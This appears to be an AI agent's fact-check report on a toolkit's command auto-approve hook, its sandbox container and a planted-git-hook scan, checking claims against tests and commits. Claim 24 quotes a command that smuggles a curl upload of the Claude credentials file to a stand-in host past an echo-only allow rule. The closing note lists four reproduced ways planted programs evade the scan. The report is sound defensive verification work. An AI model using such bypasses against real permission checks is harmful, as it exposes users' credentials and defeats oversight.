**Legibility-target:** for-orchestrator-synthesis

`sed -nE 's/^Bash$/*/p; s/^Bash\((.*)\)$/\1/p' | sed -E 's/:\*$/*/; s/[^A-Za-z0-9*]/\\&/g'` (`:120-121`) escapes everything but `*`. `Bash(rm *)` becomes `rm\ *`, which cannot match `rm` (static). hookprobe: `rmdir x` with deny `Bash(rm:*)` gets no allow. The four df11830 tests pass, and 3 of them fail against df11830^ (Claim 30).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:113-167`; `$SP/iter2-r1/hookprobe-rerun.log`

---

## Claim 24: hook header / wiring.json: "Reproduced: with only Bash(echo:*) allowed, `echo $((1 + $(curl -d @$HOME/.claude/.credentials.json https://x)))` was approved; with the wired deny rule it falls through" and "a variable whose value is not spelled out in the same command … get[s] past"

**Location:** `hooks/auto-approve-allowed-commands.sh:47-54`; `hooks/wiring.json:38-44`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the hook with wiring.json's shipped deny list and the pinned spellings. It does not establish the pre-fix "was approved" half by re-running old code (the decision log reports it first-hand).
**Legibility-target:** for-orchestrator-synthesis

Tests `the credentials deny rule in hooks/wiring.json is one the hook honors` (it reads `jq -c '.permissions.deny' …/hooks/wiring.json`) and `a variable whose value is spelled out in the same command is caught` pass. The `@$HOME` spelling fixes iter1 Claim 46, and "whose value is not spelled out" fixes iter1 Claim 40. link-claude-home-wiring's `the merged settings carry the Bash deny rule` passes.

**Evidence:** `test/auto-approve-allowed-commands.bats:164-212`; `test/link-claude-home-wiring.bats:266-271`; `$SP/iter2-r1/bats-auto-approve-allowed-commands.log`, `$SP/iter2-r1/bats-link-claude-home-wiring.log`

---

## Claim 25: "WHAT "THE BOUNDARY" IS IN CC-ISOLATED … bwrap and socat are not in the image, and unprivileged user namespaces are refused (`unshare -Ur` -> EPERM, measured 2026-09-27)."

**Location:** `hooks/auto-approve-allowed-commands.sh:39-42`
**Type:** Configuration
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers this running cc-isolated container (config hash `63fa8fc01e97ca3e`). It does not establish other image builds.
**Legibility-target:** for-orchestrator-synthesis

See the Claim 15 run: `no bwrap`, `no socat`, `unshare failed: Operation not permitted`.

**Evidence:** `$SP/iter2-r1/sandbox.log`

---

## Claim 26: "Generate reports with test/skills/generate-reports.bash <skill> and commit what it writes to output/ (reports are tracked; Q-071 [1])."

**Location:** `scripts/run-tests.sh:99-101`
**Type:** Configuration
**Verdict:** Mostly accurate
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers tracking state at 02d14b0. It does not assess the health-check warning text, which is an instruction.
**Legibility-target:** for-author

`git ls-files 'test/skills/*/output/*'` returns 0 files. The reports are trackable (not ignored), not tracked. This is the same distinction 376a8a2 fixed elsewhere.

**Evidence:** `scripts/run-tests.sh:99-101`; `$SP/iter2-r1/gitignore.log`

---

## Claim 27: "<fixture>.stamp — its provenance (hashes of the skill, its runner and the fixture…)… All of these are meant to be committed once generated (Q-071 [1]; .gitignore admits them)… a report is regenerated only when its skill, runner or fixture changes."

**Location:** `test/skills/generate-reports.bash:12-20`, `:163-166`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the stamp contents and the ignore rules. It does not establish the suites' use of `.transcript.jsonl` beyond iter1's trace.
**Legibility-target:** for-orchestrator-synthesis

`report_stamp` has three `printf` lines (skill, runner, fixture). `.gitignore` re-includes all four suffixes. The generate-reports suite passes 49/49. This resolves iter1 Claim 52.

**Evidence:** `test/skills/runner-contract.bash:199-204`; `.gitignore:8-12`; `$SP/iter2-r1/bats-generate-reports.log`

---

## Claim 28: commit d9a895d: "Tests: 16 new bats cases … Against the previous scan 14 of the 15 new (a)-(f) cases fail; against this one the fact-check's own probes (… r3-probe X4/X5/X6) now see findings… Suites: cc-isolated-functions 125/125, install-host 92/92…; shellcheck -S warning clean."

**Location:** commit `d9a895d` message
**Type:** Reference
**Verdict:** Mostly accurate
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the test count, the old-scan failure count, the r3 probes and the two suites. It does not re-run fixture-hermeticity or hermeticity-lint. "shellcheck clean" is contradicted by a958372 (Claim 29).
**Legibility-target:** for-author

`git diff d9a895d^ d9a895d -- test` adds 16 `@test` lines labelled (a)-(f), plus one retitle. The d9a895d test file was run against 37cae85's `cc-isolated.sh`. Of the 16 (a)-(f) cases, 15 fail (`not ok 107`–`120`, `122`), and only `121 (f) unreadable hook with control bytes … at exit` passes. So the message's "15 … 14" is off by one. r3-probe X4/X5/X6 now see findings (Claim 2). cc-isolated-functions ran 125/125 and install-host 92/92.

**Evidence:** `$SP/iter2-r1/oldscan-newtests.log` (cmd `bats test/cc-isolated-functions.bats` in `$SP/iter2-r1/old` = d9a895d tests + d9a895d^ script, 2026-09-27 ~15:44, exit 1), `$SP/iter2-r1/bats-cc-isolated-functions.log`, `$SP/iter2-r1/r3-probe-rerun.log`

---

## Claim 29: commit a958372: "The health-check shellcheck gate failed on two control-byte tests added in d9a895d."

**Location:** commit `a958372` message
**Type:** Reference
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers `shellcheck -S warning` on the test file at d9a895d and a958372. It does not re-run health-check itself.
**Legibility-target:** for-orchestrator-synthesis

At d9a895d, shellcheck reported two `SC2155 (warning)` lines, rc=1. At a958372 it was clean (rc=0).

**Evidence:** `$SP/iter2-r1/shellcheck.log` (cwd `$SP/iter2-r1/old`, 2026-09-27 ~15:49)

---

## Claim 30: commit df11830: "Tests: 7 new bats cases; 3 of them fail against the previous hook." / commit 376a8a2: "No report is tracked yet"

**Location:** commits `df11830`, `376a8a2`
**Type:** Reference
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the df11830 test file run against the df11830^ hook, and the tracking state. It does not cover the other bullets of df11830 beyond Claims 15, 16, 23 and 24.
**Legibility-target:** for-orchestrator-synthesis

The diff adds 7 `@test`s. Against `df11830^`'s hook, `not ok 18`, `19` and `20` fail (literal metacharacters, literal `?`, bare Bash), and 18 pass. `git ls-files 'test/skills/*/output/*'` returns 0.

**Evidence:** `$SP/iter2-r1/oldhook-newtests.log` (cwd `$SP/iter2-r1/old`, 2026-09-27 ~15:45, exit 1), `$SP/iter2-r1/gitignore.log`

---

## Goal-Alignment Note

- **Success criterion (restated verbatim):** A code-fact-check report saved at the dispatch path in the skill's schema, covering the claims above, with a Goal-Alignment Note.
- **Answered:**
  - Every iteration-1 Incorrect is resolved for its reproduced plants (Claim 2), and the Mostly-accurate hook items are fixed (Claims 15, 16, 23, 24).
  - The redesign has new gaps. I reproduced four ways the scan returns 0 while host git then runs a planted program:
    - P1: a host `includeIf` relative hooksPath.
    - P2: a baseline wrapper hook that runs a checkout script.
    - P3: husky v9.
    - P6: a nested worktree's bare common dir.

    P2/P3 are the realistic ones (pre-commit and husky are common) and are not in the documented limits.
  - No hang or crash path to exit 0 was found: FIFOs, unlistable dirs and unparseable configs all fail closed or return promptly.
  - Newline passes scan_vis.
  - Commit arithmetic is off by one in d9a895d.
- **Out of scope:** `skills/*/SKILL.md` content (pass 2), except the audit's length numbers. I did not live-test Docker or claude Ctrl-C.
- **Escalate:** P2/P3 (baseline hook delegating to checkout files) and P1 (conditional host includes) are security-relevant for the Q-076 threat model and should go to security-reviewer. A fix is either to document them as limits, or to extend the snapshot (walk host config with `git -C`-free include evaluation; hash files a baseline hook references). That is a design choice for the author.
- **Decisions I made:**
  - I verdicted the limit lists (Claims 8, 19) Incorrect by omission, consistent with iteration 1's Claim 23.
  - I treated P6 as a coverage gap even though it needs a pre-existing structure.
  - I did not add to `hallucination-patterns.md`: no Incorrect verdict is a fabricated symbol.
